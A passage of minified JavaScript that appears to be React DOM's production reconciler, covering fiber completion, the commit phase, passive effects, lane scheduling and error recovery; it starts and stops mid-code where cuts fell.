fe(n),null;if(s=(n.flags&128)!==0,a=i.rendering,a===null)if(s)ns(i,!1);else{if(se!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(a=Qr(e),a!==null){for(n.flags|=128,ns(i,!1),s=a.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)i=t,e=s,i.flags&=14680066,a=i.alternate,a===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=a.childLanes,i.lanes=a.lanes,i.child=a.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=a.memoizedProps,i.memoizedState=a.memoizedState,i.updateQueue=a.updateQueue,i.type=a.type,e=a.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return V(q,q.current&1|2),n.child}e=e.sibling}i.tail!==null&&J()>Ht&&(n.flags|=128,s=!0,ns(i,!1),n.lanes=4194304)}else{if(!s)if(e=Qr(a),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),ns(i,!0),i.tail===null&&i.tailMode==="hidden"&&!a.alternate&&!Y)return fe(n),null}else 2*J()-i.renderingStartTime>Ht&&t!==1073741824&&(n.flags|=128,s=!0,ns(i,!1),n.lanes=4194304);i.isBackwards?(a.sibling=n.child,n.child=a):(t=i.last,t!==null?t.sibling=a:n.child=a,i.last=a)}return i.tail!==null?(n=i.tail,i.rendering=n,i.tail=n.sibling,i.renderingStartTime=J(),n.sibling=null,t=q.current,V(q,s?t&1|2:t&1),n):(fe(n),null);case 22:case 23:return no(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?Le&1073741824&&(fe(n),n.subtreeFlags&6&&(n.flags|=8192)):fe(n),null;case 24:return null;case 25:return null}throw Error(C(156,n.tag))}function gm(e,n){switch(Il(n),n.tag){case 1:return Pe(n.type)&&Wr(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Ft(),G(Ae),G(ge),Wl(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return Vl(n),null;case 13:if(G(q),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(C(340));jt()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return G(q),null;case 4:return Ft(),null;case 10:return Bl(n.type._context),null;case 22:case 23:return no(),null;case 24:return null;default:return null}}var dr=!1,me=!1,ym=typeof WeakSet=="function"?WeakSet:Set,O=null;function Et(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){Z(e,n,s)}else t.current=null}function qa(e,n,t){try{t()}catch(s){Z(e,n,s)}}var bc=!1;function vm(e,n){if(La=Fr,e=up(),Ol(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var r=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{t.nodeType,i.nodeType}catch{t=null;break e}var a=0,l=-1,o=-1,c=0,u=0,h=e,f=null;n:for(;;){for(var g;h!==t||r!==0&&h.nodeType!==3||(l=a+r),h!==i||s!==0&&h.nodeType!==3||(o=a+s),h.nodeType===3&&(a+=h.nodeValue.length),(g=h.firstChild)!==null;)f=h,h=g;for(;;){if(h===e)break n;if(f===t&&++c===r&&(l=a),f===i&&++u===s&&(o=a),(g=h.nextSibling)!==null)break;h=f,f=h.parentNode}h=g}t=l===-1||o===-1?null:{start:l,end:o}}else t=null}t=t||{start:0,end:0}}else t=null;for(Ra={focusedElem:e,selectionRange:t},Fr=!1,O=n;O!==null;)if(n=O,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,O=e;else for(;O!==null;){n=O;try{var k=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(k!==null){var y=k.memoizedProps,w=k.memoizedState,d=n.stateNode,p=d.getSnapshotBeforeUpdate(n.elementType===n.type?y:$e(n.type,y),w);d.__reactInternalSnapshotBeforeUpdate=p}break;case 3:var m=n.stateNode.containerInfo;m.nodeType===1?m.textContent="":m.nodeType===9&&m.documentElement&&m.removeChild(m.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(C(163))}}catch(v){Z(n,n.return,v)}if(e=n.sibling,e!==null){e.return=n.return,O=e;break}O=n.return}return k=bc,bc=!1,k}function ys(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var i=r.destroy;r.destroy=void 0,i!==void 0&&qa(n,t,i)}r=r.next}while(r!==s)}}function bi(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function Xa(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function ad(e){var n=e.alternate;n!==null&&(e.alternate=null,ad(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[nn],delete n[Ns],delete n[Ia],delete n[em],delete n[nm])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function ld(e){return e.tag===5||e.tag===3||e.tag===4}function xc(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||ld(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Ka(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Vr));else if(s!==4&&(e=e.child,e!==null))for(Ka(e,n,t),e=e.sibling;e!==null;)Ka(e,n,t),e=e.sibling}function Qa(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Qa(e,n,t),e=e.sibling;e!==null;)Qa(e,n,t),e=e.sibling}var oe=null,Ge=!1;function xn(e,n,t){for(t=t.child;t!==null;)od(e,n,t),t=t.sibling}function od(e,n,t){if(tn&&typeof tn.onCommitFiberUnmount=="function")try{tn.onCommitFiberUnmount(hi,t)}catch{}switch(t.tag){case 5:me||Et(t,n);case 6:var s=oe,r=Ge;oe=null,xn(e,n,t),oe=s,Ge=r,oe!==null&&(Ge?(e=oe,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):oe.removeChild(t.stateNode));break;case 18:oe!==null&&(Ge?(e=oe,t=t.stateNode,e.nodeType===8?Ki(e.parentNode,t):e.nodeType===1&&Ki(e,t),Es(e)):Ki(oe,t.stateNode));break;case 4:s=oe,r=Ge,oe=t.stateNode.containerInfo,Ge=!0,xn(e,n,t),oe=s,Ge=r;break;case 0:case 11:case 14:case 15:if(!me&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var i=r,a=i.destroy;i=i.tag,a!==void 0&&(i&2||i&4)&&qa(t,n,a),r=r.next}while(r!==s)}xn(e,n,t);break;case 1:if(!me&&(Et(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){Z(t,n,l)}xn(e,n,t);break;case 21:xn(e,n,t);break;case 22:t.mode&1?(me=(s=me)||t.memoizedState!==null,xn(e,n,t),me=s):xn(e,n,t);break;default:xn(e,n,t)}}function _c(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new ym),n.forEach(function(s){var r=Cm.bind(null,e,s);t.has(s)||(t.add(s),s.then(r,r))})}}function We(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var r=t[s];try{var i=e,a=n,l=a;e:for(;l!==null;){switch(l.tag){case 5:oe=l.stateNode,Ge=!1;break e;case 3:oe=l.stateNode.containerInfo,Ge=!0;break e;case 4:oe=l.stateNode.containerInfo,Ge=!0;break e}l=l.return}if(oe===null)throw Error(C(160));od(i,a,r),oe=null,Ge=!1;var o=r.alternate;o!==null&&(o.return=null),r.return=null}catch(c){Z(r,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)cd(n,e),n=n.sibling}function cd(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(We(n,e),Je(e),s&4){try{ys(3,e,e.return),bi(3,e)}catch(y){Z(e,e.return,y)}try{ys(5,e,e.return)}catch(y){Z(e,e.return,y)}}break;case 1:We(n,e),Je(e),s&512&&t!==null&&Et(t,t.return);break;case 5:if(We(n,e),Je(e),s&512&&t!==null&&Et(t,t.return),e.flags&32){var r=e.stateNode;try{bs(r,"")}catch(y){Z(e,e.return,y)}}if(s&4&&(r=e.stateNode,r!=null)){var i=e.memoizedProps,a=t!==null?t.memoizedProps:i,l=e.type,o=e.updateQueue;if(e.updateQueue=null,o!==null)try{l==="input"&&i.type==="radio"&&i.name!=null&&Lu(r,i),ba(l,a);var c=ba(l,i);for(a=0;a<o.length;a+=2){var u=o[a],h=o[a+1];u==="style"?zu(r,h):u==="dangerouslySetInnerHTML"?Mu(r,h):u==="children"?bs(r,h):kl(r,u,h,c)}switch(l){case"input":ga(r,i);break;case"textarea":Ru(r,i);break;case"select":var f=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!i.multiple;var g=i.value;g!=null?At(r,!!i.multiple,g,!1):f!==!!i.multiple&&(i.defaultValue!=null?At(r,!!i.multiple,i.defaultValue,!0):At(r,!!i.multiple,i.multiple?[]:"",!1))}r[Ns]=i}catch(y){Z(e,e.return,y)}}break;case 6:if(We(n,e),Je(e),s&4){if(e.stateNode===null)throw Error(C(162));r=e.stateNode,i=e.memoizedProps;try{r.nodeValue=i}catch(y){Z(e,e.return,y)}}break;case 3:if(We(n,e),Je(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{Es(n.containerInfo)}catch(y){Z(e,e.return,y)}break;case 4:We(n,e),Je(e);break;case 13:We(n,e),Je(e),r=e.child,r.flags&8192&&(i=r.memoizedState!==null,r.stateNode.isHidden=i,!i||r.alternate!==null&&r.alternate.memoizedState!==null||(Jl=J())),s&4&&_c(e);break;case 22:if(u=t!==null&&t.memoizedState!==null,e.mode&1?(me=(c=me)||u,We(n,e),me=c):We(n,e),Je(e),s&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!u&&e.mode&1)for(O=e,u=e.child;u!==null;){for(h=O=u;O!==null;){switch(f=O,g=f.child,f.tag){case 0:case 11:case 14:case 15:ys(4,f,f.return);break;case 1:Et(f,f.return);var k=f.stateNode;if(typeof k.componentWillUnmount=="function"){s=f,t=f.return;try{n=s,k.props=n.memoizedProps,k.state=n.memoizedState,k.componentWillUnmount()}catch(y){Z(s,t,y)}}break;case 5:Et(f,f.return);break;case 22:if(f.memoizedState!==null){Ec(h);continue}}g!==null?(g.return=f,O=g):Ec(h)}u=u.sibling}e:for(u=null,h=e;;){if(h.tag===5){if(u===null){u=h;try{r=h.stateNode,c?(i=r.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(l=h.stateNode,o=h.memoizedProps.style,a=o!=null&&o.hasOwnProperty("display")?o.display:null,l.style.display=Iu("display",a))}catch(y){Z(e,e.return,y)}}}else if(h.tag===6){if(u===null)try{h.stateNode.nodeValue=c?"":h.memoizedProps}catch(y){Z(e,e.return,y)}}else if((h.tag!==22&&h.tag!==23||h.memoizedState===null||h===e)&&h.child!==null){h.child.return=h,h=h.child;continue}if(h===e)break e;for(;h.sibling===null;){if(h.return===null||h.return===e)break e;u===h&&(u=null),h=h.return}u===h&&(u=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:We(n,e),Je(e),s&4&&_c(e);break;case 21:break;default:We(n,e),Je(e)}}function Je(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(ld(t)){var s=t;break e}t=t.return}throw Error(C(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(bs(r,""),s.flags&=-33);var i=xc(e);Qa(e,i,r);break;case 3:case 4:var a=s.stateNode.containerInfo,l=xc(e);Ka(e,l,a);break;default:throw Error(C(161))}}catch(o){Z(e,e.return,o)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function wm(e,n,t){O=e,ud(e)}function ud(e,n,t){for(var s=(e.mode&1)!==0;O!==null;){var r=O,i=r.child;if(r.tag===22&&s){var a=r.memoizedState!==null||dr;if(!a){var l=r.alternate,o=l!==null&&l.memoizedState!==null||me;l=dr;var c=me;if(dr=a,(me=o)&&!c)for(O=r;O!==null;)a=O,o=a.child,a.tag===22&&a.memoizedState!==null?Tc(r):o!==null?(o.return=a,O=o):Tc(r);for(;i!==null;)O=i,ud(i),i=i.sibling;O=r,dr=l,me=c}Sc(e)}else r.subtreeFlags&8772&&i!==null?(i.return=r,O=i):Sc(e)}}function Sc(e){for(;O!==null;){var n=O;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:me||bi(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!me)if(t===null)s.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:$e(n.type,t.memoizedProps);s.componentDidUpdate(r,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=n.updateQueue;i!==null&&oc(n,i,s);break;case 3:var a=n.updateQueue;if(a!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}oc(n,a,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var o=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":o.autoFocus&&t.focus();break;case"img":o.src&&(t.src=o.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var u=c.memoizedState;if(u!==null){var h=u.dehydrated;h!==null&&Es(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(C(163))}me||n.flags&512&&Xa(n)}catch(f){Z(n,n.return,f)}}if(n===e){O=null;break}if(t=n.sibling,t!==null){t.return=n.return,O=t;break}O=n.return}}function Ec(e){for(;O!==null;){var n=O;if(n===e){O=null;break}var t=n.sibling;if(t!==null){t.return=n.return,O=t;break}O=n.return}}function Tc(e){for(;O!==null;){var n=O;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{bi(4,n)}catch(o){Z(n,t,o)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var r=n.return;try{s.componentDidMount()}catch(o){Z(n,r,o)}}var i=n.return;try{Xa(n)}catch(o){Z(n,i,o)}break;case 5:var a=n.return;try{Xa(n)}catch(o){Z(n,a,o)}}}catch(o){Z(n,n.return,o)}if(n===e){O=null;break}var l=n.sibling;if(l!==null){l.return=n.return,O=l;break}O=n.return}}var km=Math.ceil,ei=bn.ReactCurrentDispatcher,Ql=bn.ReactCurrentOwner,Ue=bn.ReactCurrentBatchConfig,U=0,ie=null,ee=null,ce=0,Le=0,Tt=$n(0),se=0,zs=null,ot=0,xi=0,Zl=0,vs=null,Ee=null,Jl=0,Ht=1/0,cn=null,ni=!1,Za=null,jn=null,hr=!1,Nn=null,ti=0,ws=0,Ja=null,Ar=-1,Pr=0;function be(){return U&6?J():Ar!==-1?Ar:Ar=J()}function Bn(e){return e.mode&1?U&2&&ce!==0?ce&-ce:sm.transition!==null?(Pr===0&&(Pr=qu()),Pr):(e=H,e!==0||(e=window.event,e=e===void 0?16:np(e.type)),e):1}function Ke(e,n,t,s){if(50<ws)throw ws=0,Ja=null,Error(C(185));Ws(e,t,s),(!(U&2)||e!==ie)&&(e===ie&&(!(U&2)&&(xi|=t),se===4&&An(e,ce)),Ne(e,s),t===1&&U===0&&!(n.mode&1)&&(Ht=J()+500,vi&&Gn()))}function Ne(e,n){var t=e.callbackNode;tf(e,n);var s=Br(e,e===ie?ce:0);if(s===0)t!==null&&Io(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&Io(t),n===1)e.tag===0?tm(Cc.bind(null,e)):kp(Cc.bind(null,e)),Zf(function(){!(U&6)&&Gn()}),t=null;else{switch(Xu(s)){case 1:t=El;break;case 4:t=Gu;break;case 16:t=jr;break;case 536870912:t=Yu;break;default:t=jr}t=vd(t,pd.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function pd(e,n){if(Ar=-1,Pr=0,U&6)throw Error(C(327));var t=e.callbackNode;if(Ot()&&e.callbackNode!==t)return null;var s=Br(e,e===ie?ce:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=si(e,s);else{n=s;var r=U;U|=2;var i=hd();(ie!==e||ce!==n)&&(cn=null,Ht=J()+500,nt(e,n));do try{_m();break}catch(l){dd(e,l)}while(!0);jl(),ei.current=i,U=r,ee!==null?n=0:(ie=null,ce=0,n=se)}if(n!==0){if(n===2&&(r=Ta(e),r!==0&&(s=r,n=el(e,r))),n===1)throw t=zs,nt(e,0),An(e,s),Ne(e,J()),t;if(n===6)An(e,s);else{if(r=e.current.alternate,!(s&30)&&!bm(r)&&(n=si(e,s),n===2&&(i=Ta(e),i!==0&&(s=i,n=el(e,i))),n===1))throw t=zs,nt(e,0),An(e,s),Ne(e,J()),t;switch(e.finishedWork=r,e.finishedLanes=s,n){case 0:case 1:throw Error(C(345));case 2:Kn(e,Ee,cn);break;case 3:if(An(e,s),(s&130023424)===s&&(n=Jl+500-J(),10<n)){if(Br(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){be(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=Ma(Kn.bind(null,e,Ee,cn),n);break}Kn(e,Ee,cn);break;case 4:if(An(e,s),(s&4194240)===s)break;for(n=e.eventTimes,r=-1;0<s;){var a=31-Xe(s);i=1<<a,a=n[a],a>r&&(r=a),s&=~i}if(s=r,s=J()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*km(s/1960))-s,10<s){e.timeoutHandle=Ma(Kn.bind(null,e,Ee,cn),s);break}Kn(e,Ee,cn);break;case 5:Kn(e,Ee,cn);break;default:throw Error(C(329))}}}return Ne(e,J()),e.callbackNode===t?pd.bind(null,e):null}function el(e,n){var t=vs;return e.current.memoizedState.isDehydrated&&(nt(e,n).flags|=256),e=si(e,n),e!==2&&(n=Ee,Ee=t,n!==null&&nl(n)),e}function nl(e){Ee===null?Ee=e:Ee.push.apply(Ee,e)}function bm(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var r=t[s],i=r.getSnapshot;r=r.value;try{if(!Qe(i(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function An(e,n){for(n&=~Zl,n&=~xi,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Xe(n),s=1<<t;e[t]=-1,n&=~s}}function Cc(e){if(U&6)throw Error(C(327));Ot();var n=Br(e,0);if(!(n&1))return Ne(e,J()),null;var t=si(e,n);if(e.tag!==0&&t===2){var s=Ta(e);s!==0&&(n=s,t=el(e,s))}if(t===1)throw t=zs,nt(e,0),An(e,n),Ne(e,J()),t;if(t===6)throw Error(C(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Kn(e,Ee,cn),Ne(e,J()),null}function eo(e,n){var t=U;U|=1;try{return e(n)}finally{U=t,U===0&&(Ht=J()+500,vi&&Gn())}}function ct(e){Nn!==null&&Nn.tag===0&&!(U&6)&&Ot();var n=U;U|=1;var t=Ue.transition,s=H;try{if(Ue.transition=null,H=1,e)return e()}finally{H=s,Ue.transition=t,U=n,!(U&6)&&Gn()}}function no(){Le=Tt.current,G(Tt)}function nt(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Qf(t)),ee!==null)for(t=ee.return;t!==null;){var s=t;switch(Il(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Wr();break;case 3:Ft(),G(Ae),G(ge),Wl();break;case 5:Vl(s);break;case 4:Ft();break;case 13:G(q);break;case 19:G(q);break;case 10:Bl(s.type._context);break;case 22:case 23:no()}t=t.return}if(ie=e,ee=e=Fn(e.current,null),ce=Le=n,se=0,zs=null,Zl=xi=ot=0,Ee=vs=null,Zn!==null){for(n=0;n<Zn.length;n++)if(t=Zn[n],s=t.interleaved,s!==null){t.interleaved=null;var r=s.next,i=t.pending;if(i!==null){var a=i.next;i.next=r,s.next=a}t.pending=s}Zn=null}return e}function dd(e,n){do{var t=ee;try{if(jl(),Er.current=Jr,Zr){for(var s=X.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}Zr=!1}if(lt=0,re=te=X=null,gs=!1,Os=0,Ql.current=null,t===null||t.return===null){se=1,zs=n,ee=null;break}e:{var i=e,a=t.return,l=t,o=n;if(n=ce,l.flags|=32768,o!==null&&typeof o=="object"&&typeof o.then=="function"){var c=o,u=l,h=u.tag;if(!(u.mode&1)&&(h===0||h===11||h===15)){var f=u.alternate;f?(u.updateQueue=f.updateQueue,u.memoizedState=f.memoizedState,u.lanes=f.lanes):(u.updateQueue=null,u.memoizedState=null)}var g=fc(a);if(g!==null){g.flags&=-257,mc(g,a,l,i,n),g.mode&1&&hc(i,c,n),n=g,o=c;var k=n.updateQueue;if(k===null){var y=new Set;y.add(o),n.updateQueue=y}else k.add(o);break e}else{if(!(n&1)){hc(i,c,n),to();break e}o=Error(C(426))}}else if(Y&&l.mode&1){var w=fc(a);if(w!==null){!(w.flags&65536)&&(w.flags|=256),mc(w,a,l,i,n),zl(Ut(o,l));break e}}i=o=Ut(o,l),se!==4&&(se=2),vs===null?vs=[i]:vs.push(i),i=a;do{switch(i.tag){case 3:i.flags|=65536,n&=-n,i.lanes|=n;var d=Xp(i,o,n);lc(i,d);break e;case 1:l=o;var p=i.type,m=i.stateNode;if(!(i.flags&128)&&(typeof p.getDerivedStateFromError=="function"||m!==null&&typeof m.componentDidCatch=="function"&&(jn===null||!jn.has(m)))){i.flags|=65536,n&=-n,i.lanes|=n;var v=Kp(i,l,n);lc(i,v);break e}}i=i.return}while(i!==null)}md(t)}catch(x){n=x,ee===t&&t!==null&&(ee=t=t.return);continue}break}while(!0)}function hd(){var e=ei.current;return ei.current=Jr,e===null?Jr:e}function to(){(se===0||se===3||se===2)&&(se=4),ie===null||!(ot&268435455)&&!(xi&268435455)||An(ie,ce)}function si(e,n){var t=U;U|=2;var s=hd();(ie!==e||ce!==n)&&(cn=null,nt(e,n));do try{xm();break}catch(r){dd(e,r)}while(!0);if(jl(),U=t,ei.current=s,ee!==null)throw Error(C(261));return ie=null,ce=0,se}function xm(){for(;ee!==null;)fd(ee)}function _m(){for(;ee!==null&&!Yh();)fd(ee)}function fd(e){var n=yd(e.alternate,e,Le);e.memoizedProps=e.pendingProps,n===null?md(e):ee=n,Ql.current=null}function md(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=gm(t,n),t!==null){t.flags&=32767,ee=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{se=6,ee=null;return}}else if(t=mm(t,n,Le),t!==null){ee=t;return}if(n=n.sibling,n!==null){ee=n;return}ee=n=e}while(n!==null);se===0&&(se=5)}function Kn(e,n,t){var s=H,r=Ue.transition;try{Ue.transition=null,H=1,Sm(e,n,t,s)}finally{Ue.transition=r,H=s}return null}function Sm(e,n,t,s){do Ot();while(Nn!==null);if(U&6)throw Error(C(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(C(177));e.callbackNode=null,e.callbackPriority=0;var i=t.lanes|t.childLanes;if(sf(e,i),e===ie&&(ee=ie=null,ce=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||hr||(hr=!0,vd(jr,function(){return Ot(),null})),i=(t.flags&15990)!==0,t.subtreeFlags&15990||i){i=Ue.transition,Ue.transition=null;var a=H;H=1;var l=U;U|=4,Ql.current=null,vm(e,t),cd(t,e),Wf(Ra),Fr=!!La,Ra=La=null,e.current=t,wm(t),qh(),U=l,H=a,Ue.transition=i}else e.current=t;if(hr&&(hr=!1,Nn=e,ti=r),i=e.pendingLanes,i===0&&(jn=null),Qh(t.stateNode),Ne(e,J()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],s(r.value,{componentStack:r.stack,digest:r.digest});if(ni)throw ni=!1,e=Za,Za=null,e;return ti&1&&e.tag!==0&&Ot(),i=e.pendingLanes,i&1?e===Ja?ws++:(ws=0,Ja=e):ws=0,Gn(),null}function Ot(){if(Nn!==null){var e=Xu(ti),n=Ue.transition,t=H;try{if(Ue.transition=null,H=16>e?16:e,Nn===null)var s=!1;else{if(e=Nn,Nn=null,ti=0,U&6)throw Error(C(331));var r=U;for(U|=4,O=e.current;O!==null;){var i=O,a=i.child;if(O.flags&16){var l=i.deletions;if(l!==null){for(var o=0;o<l.length;o++){var c=l[o];for(O=c;O!==null;){var u=O;switch(u.tag){case 0:case 11:case 15:ys(8,u,i)}var h=u.child;if(h!==null)h.return=u,O=h;else for(;O!==null;){u=O;var f=u.sibling,g=u.return;if(ad(u),u===c){O=null;break}if(f!==null){f.return=g,O=f;break}O=g}}}var k=i.alternate;if(k!==null){var y=k.child;if(y!==null){k.child=null;do{var w=y.sibling;y.sibling=null,y=w}while(y!==null)}}O=i}}if(i.subtreeFlags&2064&&a!==null)a.return=i,O=a;else e:for(;O!==null;){if(i=O,i.flags&2048)switch(i.tag){case 0:case 11:case 15:ys(9,i,i.return)}var d=i.sibling;if(d!==null){d.return=i.return,O=d;break e}O=i.return}}var p=e.current;for(O=p;O!==null;){a=O;var m=a.child;if(a.subtreeFlags&2064&&m!==null)m.return=a,O=m;else e:for(a=p;O!==null;){if(l=O,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:bi(9,l)}}catch(x){Z(l,l.return,x)}if(l===a){O=null;break e}var v=l.sibling;if(v!==null){v.return=l.return,O=v;break e}O=l.return}}if(U=r,Gn(),tn&&typeof tn.onPostCommitFiberRoot=="function")try{tn.onPostCommitFiberRoot(hi,e)}catch{}s=!0}return s}finally{H=t,Ue.transition=n}}return!1}function Ac(e,n,t){n=Ut(t,n),n=Xp(e,n,1),e=Dn(e,n,1),n=be(),e!==null&&(Ws(e,1,n),Ne(e,n))}function Z(e,n,t){if(e.tag===3)Ac(e,e,t);else for(;n!==null;){if(n.tag===3){Ac(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(jn===null||!jn.has(s))){e=Ut(t,e),e=Kp(n,e,1),n=Dn(n,e,1),e=be(),n!==null&&(Ws(n,1,e),Ne(n,e));break}}n=n.return}}function Em(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=be(),e.pingedLanes|=e.suspendedLanes&t,ie===e&&(ce&t)===t&&(se===4||se===3&&(ce&130023424)===ce&&500>J()-Jl?nt(e,0):Zl|=t),Ne(e,n)}function gd(e,n){n===0&&(e.mode&1?(n=sr,sr<<=1,!(sr&130023424)&&(sr=4194304)):n=1);var t=be();e=vn(e,n),e!==null&&(Ws(e,n,t),Ne(e,t))}function Tm(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),gd(e,t)}function Cm(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(C(314))}s!==null&&s.delete(n),gd(e,t)}var yd;yd=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||Ae.current)Te=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return Te=!1,fm(e,n,t);Te=!!(e.flags&131072)}else Te=!1,Y&&n.flags&1048576&&bp(n,Yr,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;Cr(e,n),e=n.pendingProps;var r=Dt(n,ge.current);Rt(n,t),r=Gl(null,n,s,e,r,t);var i=Yl();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,Pe(s)?(i=!0,$r(n)):i=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,Ul(n),r.updater=ki,n.stateNode=r,r._reactInternals=n,Ua(n,s,e,t),n=Wa(null,n,s,!0,i,t)):(n.tag=0,Y&&i&&Ml(n),we(null,n,r,t),n=n.child),n;case 16:s=n.elementType;e:{switch(Cr(e,n),e=n.pendingProps,r=s._init,s=r(s._payload),n.type=s,r=n.tag=Pm(s),e=$e(s,e),r){case 